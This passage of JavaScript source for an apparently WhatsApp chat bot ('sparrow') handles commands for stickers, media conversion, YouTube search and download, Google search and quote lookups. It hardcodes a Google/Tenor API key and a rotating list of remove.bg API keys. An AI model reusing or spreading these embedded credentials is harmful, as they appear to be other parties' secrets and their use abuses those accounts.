                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `🏷𝖓𝖆𝖒𝖊 : ${nama}\n🏷𝖚𝖘𝖊𝖗 : @${i.split('@')[0]}\n🏷𝖈𝖍𝖆𝖙 : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 sparrow.reply(m.chat, teks, m)
             }
             break
                case 'listgc': {
                if (!isCreator) throw mess.owner
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `𝖌𝖗𝖔𝖚𝖕 𝖈𝖍𝖆𝖙 𝖑𝖎𝖘𝖙\n\n🌹𝖙𝖔𝖙𝖆𝖑 𝖌𝖗𝖔𝖚𝖕𝖘 : ${anu.length} 𝖌𝖗𝖔𝖚𝖕𝖘\n\n`
                 for (let i of anu) {
                     let metadata = await sparrow.groupMetadata(i)
                     teks += `🏷𝖓𝖆𝖒𝖊 :* ${metadata.subject}\n🏷𝖔𝖜𝖓𝖊𝖗 : @${metadata.owner.split('@')[0]}\n🏷𝖎𝖉 : ${metadata.id}\n🏷𝖈𝖗𝖊𝖆𝖙𝖊𝖉 𝖉𝖆𝖙𝖊 : ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n🏷𝖙𝖔𝖙𝖆𝖑 𝖕𝖆𝖗𝖙𝖎𝖈𝖎𝖕𝖆𝖓𝖙𝖘 : ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 sparrow.reply(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    sparrow.reply(m.chat, '𝖔𝖓𝖑𝖎𝖓𝖊 𝖑𝖎𝖘𝖙:\n\n' + online.map(v => '🌹@' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊/𝖛𝖎𝖉𝖊𝖔`
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await sparrow.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊/𝖛𝖎𝖉𝖊𝖔 𝖑𝖊𝖘𝖘 𝖙𝖍𝖆𝖓 9 𝖘𝖊𝖈!')
                let media = await quoted.download()
                let encmedia = await sparrow.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊/𝖛𝖎𝖉𝖊𝖔 𝖑𝖊𝖘𝖘 𝖙𝖍𝖆𝖓 9 𝖘𝖊𝖈!`
                }
            }
            break
            case 'emojimix': {
	        if (!text) throw `𝖊𝖝𝖆𝖒𝖕𝖑𝖊 : ${prefix + command} 😅+🤔`
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await sparrow.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'smeme': {
	        if (!text) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖎𝖒𝖆𝖌𝖊/𝖘𝖙𝖎𝖈𝖐𝖊𝖗 𝖜𝖎𝖙𝖍 𝖈𝖔𝖒𝖒𝖆𝖓𝖉 ${prefix + command} 𝖙𝖊𝖝𝖙1|𝖙𝖊𝖝𝖙2`
	        if (!/image/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖎𝖒𝖆𝖌𝖊/𝖘𝖙𝖎𝖈𝖐𝖊𝖗 𝖜𝖎𝖙𝖍 𝖈𝖔𝖒𝖒𝖆𝖓𝖉 ${prefix + command} 𝖙𝖊𝖝𝖙1|𝖙𝖊𝖝𝖙2`
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
	        let [teks1, teks2] = text.split`|`
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(teks1)}/${encodeURIComponent(teks2)}.png?background=${fatGans.result.url}`
	        let FaTiH = await sparrow.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖘𝖙𝖎𝖈𝖐𝖊𝖗!`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    sparrow.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖛𝖎𝖉𝖊𝖔!`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let { webp2mp4File } = require('./lib/uploader')
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await sparrow.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖆𝖚𝖉𝖎𝖔/𝖛𝖎𝖉𝖊𝖔!`
            if (!quoted) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖆𝖚𝖉𝖎𝖔/𝖛𝖎𝖉𝖊𝖔!`
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            sparrow.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': case 'mp3': case '8daudio': case '8d': {
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                try {
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} -af apulsator=hz=0.125 ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                sparrow.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' ,contextInfo: {'externalAdReply':{'title':`${prefix + command}`,'body':'𝖏𝖆𝖗𝖛𝖎𝖘','previewType':'VIDEO','thumbnailUrl':'','thumbnail':fs.readFileSync('./lib/jarvis.jpg'),'sourceUrl':'https://github.com/sparroo'}}}, { quoted : m })
                fs.unlinkSync(ran)
                })
                } catch (e) {
                m.reply(e)
                }}
            
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖛𝖎𝖉𝖊𝖔!`
            if (!quoted) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖛𝖎𝖉𝖊𝖔!`
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            sparrow.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw '𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖘𝖙𝖎𝖈𝖐𝖊𝖗!'
                if (!/webp/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖘𝖙𝖎𝖈𝖐𝖊𝖗!`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let { webp2mp4File } = require('./lib/uploader')
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await sparrow.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
	    if (!/image/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
	    if (/webp/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
	    if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await sparrow.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    sparrow.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = '──────〔 𝖞𝖔𝖚𝖙𝖚𝖇𝖗 𝖘𝖊𝖆𝖗𝖈𝖍 〕──────\n\n📜𝖗𝖊𝖘𝖚𝖑𝖙 𝖔𝖋 '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `🌹𝖓𝖔 : ${no++}\n🌹𝖙𝖎𝖙𝖑𝖊 : ${i.title}\n🌹𝖙𝖞𝖕𝖊 : ${i.type}\n🌹𝖛𝖎𝖉𝖊𝖔 𝖎𝖉 : ${i.videoId}\n🌹𝖛𝖎𝖊𝖜𝖘 : ${i.views}\n🌹𝖉𝖚𝖗𝖎𝖆𝖙𝖎𝖔𝖓 : ${i.timestamp}\n🌹𝖚𝖕𝖑𝖔𝖆𝖉𝖊𝖉 𝖆𝖙 : ${i.ago}\n🌹𝖆𝖚𝖙𝖍𝖔𝖗 : ${i.author.name}\n🌹𝖚𝖗𝖑 : ${i.url}\n\n─────────────────\n\n`
                }
                teks += `──────〔 𝖞𝖔𝖚𝖙𝖚𝖇𝖗 𝖘𝖊𝖆𝖗𝖈𝖍 〕──────`
                sparrow.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `──────〔 𝖌𝖔𝖔𝖌𝖑𝖊 〕──────\n\n📜𝖘𝖊𝖆𝖗𝖈𝖍 𝖗𝖊𝖘𝖚𝖑𝖙 𝖔𝖋 : ${text}\n\n`
                for (let g of res) {
                teks += `🌹𝖙𝖎𝖙𝖑𝖊 : ${g.title}\n`
                teks += `🌹𝖉𝖊𝖘𝖈𝖗𝖎𝖕𝖙𝖎𝖔𝖓 : ${g.snippet}\n`
                teks += `🌹𝖑𝖎𝖓𝖐 : ${g.link}\n\n────────────────────────\n\n`
                } 
                teks += `──────〔 𝖌𝖔𝖔𝖌𝖑𝖊 〕──────`
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `𝖊𝖝𝖆𝖒𝖕𝖑𝖊 : ${prefix + command} 𝖏𝖆𝖗𝖛𝖎𝖘`
        if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: '𝖓𝖊𝖝𝖙 𝖎𝖒𝖆𝖌𝖊'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: ` 𝖌𝖔𝖔𝖌𝖑𝖊 𝖎𝖒𝖆𝖌𝖊
🔎𝖘𝖊𝖆𝖗𝖈𝖍 : ${text}
🔗𝖚𝖗𝖑 : ${images}`,
                    footer: sparrow.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                sparrow.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
        
        case 'play': {
if (!text) throw `Example : ${prefix + command} arcade`
if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
db.data.users[m.sender].limit -= 1
let { ytsr } = require ('./lib/ytdl.js')
		    console.log(chalk.redBright(`started`))
		    let yt = await yts(q)
		    let { youtube } = require('./lib/scrape')
let nuh = await youtube(yt[0].url)
      const { title, link, size, quality,  } = nuh                 
  await getBuffer(link)
      .then(async result => {
   	    let ranV = getRandom('.mp4')
        await fs.writeFileSync('./lib/' + ranV, result)
        const buff = './lib/' + ranV    
        console.log(result)                

     if (link === 'undefined') return m.reply('error link!')
     m.reply('Sending.....') 
         let vid = {
          video: {
           url: buff
           }, 
          caption:"*[❗] Done️*\n" + '```' + title + '```',     
          contextInfo:{
           externalAdReply:{
             showAdAttribution: true,
             mediaType: 1
            }
           }
         }
        sparrow.sendMessage(m.chat, vid, { quoted : m })
       setTimeout(() => { fs.unlinkSync(buff) }, 10000)

       })

} break
        
        
	    case 'play2': {
                if (!text) throw `Example : ${prefix + command} arcade`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let { youtube } = require('./lib/scrape')
let nuh = await youtube(q)
      const { title, link, size, quality,  } = nuh                 
  await getBuffer(link)
      .then(async result => {
   	    let ranV = getRandom('.mp4')
        await fs.writeFileSync('./lib/' + ranV, result)
        const buff = './lib/' + ranV    
        console.log(result)                

     if (link === 'undefined') return m.reply('error link!')
     m.reply('Sending.....') 
         let vid = {
          video: {
           url: buff
           }, 
          caption:"*[❗] Done️*\n" + '```' + title + '```',     
          contextInfo:{
           externalAdReply:{
             showAdAttribution: true,
             mediaType: 1
            }
           }
         }
        sparrow.sendMessage(m.chat, vid, { quoted : m })
       setTimeout(() => { fs.unlinkSync(buff) }, 10000)

       })

            }
            break
            
            case 'yts': {
if (!text) throw `Example : ${prefix + command} love story`
if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
let { ytsr } = require ('./lib/ytdl.js')
		    if(!q)return reply('query?')
		    console.log(chalk.redBright(`started`))
		    yts(q).then( data => {
				  let yt = data.videos
				  var jumlah = 10
				  if (yt.length < jumlah) jumlah = yt.length
				  var no = 0
				  let txt = `𝖄𝖔𝖚𝖙𝖚𝖇𝖊 𝖘𝖊𝖆𝖗𝖈𝖍

 𝖗𝖊𝖘𝖚𝖑𝖙 𝖋𝖔𝖗 ${q}
 
 Untuk mengambil Audio/Video dari hasil pencarian
 silahkan salin lalu ketik ${prefix}ytdl`
                for (let i = 0; i < jumlah; i++) {
				  no += 1
				  txt += `\n─────────────────\n\n*𝖓𝖔 : ${no.toString()}*\n*▢ 𝖓𝖆𝖒𝖊 :* ${yt[i].title}\n*▢ 𝖎𝖉 :* ${yt[i].videoId}\n*▢ 𝖈𝖍𝖆𝖓𝖓𝖊𝖑 :* ${yt[i].author.name}\n*▢ 𝖚𝖕𝖑𝖔𝖆𝖉 :* ${yt[i].ago}\n*▢ 𝖛𝖎𝖊𝖜𝖘 :* ${yt[i].views}\n*▢ 𝖉𝖚𝖗𝖎𝖆𝖙𝖎𝖔𝖓 :* ${yt[i].timestamp}\n*▢ 𝖚𝖗𝖑 :* ${yt[i].url}\n`
				}													
				var img = `${yt[0].image}`
				sparrow.sendImage(m.chat, img, txt, m)

})

} break            
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text)
                if (media.filesize >= 100000) return m.reply('𝖋𝖎𝖑𝖊 𝖎𝖘 𝖌𝖗𝖊𝖆𝖙𝖊𝖗 𝖙𝖍𝖆𝖓 𝖙𝖍𝖊 𝖉𝖔𝖜𝖓𝖑𝖔𝖆𝖉 𝖑𝖎𝖒𝖎𝖙 '+util.format(media))
                sparrow.sendImage(m.chat, media.thumb, `🌹𝖙𝖎𝖙𝖑𝖊 : ${media.title}\n🌹𝖋𝖎𝖑𝖊 𝖘𝖎𝖟𝖊 : ${media.filesizeF}\n🌹𝖚𝖗𝖑 : ${isUrl(text)}\n🌹𝖊𝖝𝖙𝖊𝖓𝖘𝖎𝖔𝖓 : MP3\n🌹𝖗𝖊𝖘𝖔𝖑𝖚𝖙𝖎𝖔𝖓 : ${args[1] || '128kbps'}`, m)
                sparrow.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3`, contextInfo: {'externalAdReply':{'title':'𝖍𝖊𝖑𝖑𝖔','body':'𝖙𝖍𝖊𝖗𝖊','previewType':'VIDEO','thumbnailUrl':'','thumbnail':fs.readFileSync('./lib/jarvis.jpg'),'sourceUrl':'https://github.com/sparroo'}}}, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('𝖋𝖎𝖑𝖊 𝖎𝖘 𝖌𝖗𝖊𝖆𝖙𝖊𝖗 𝖙𝖍𝖆𝖓 𝖙𝖍𝖊 𝖉𝖔𝖜𝖓𝖑𝖔𝖆𝖉 𝖑𝖎𝖒𝖎𝖙 '+util.format(media))
                sparrow.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `🌹Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                sparrow.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                sparrow.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                sparrow.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                sparrow.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
            }
            break

	    
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer: sparrow.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                sparrow.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                sparrow.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                sparrow.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break

            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                sparrow.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
        

		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
		   if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
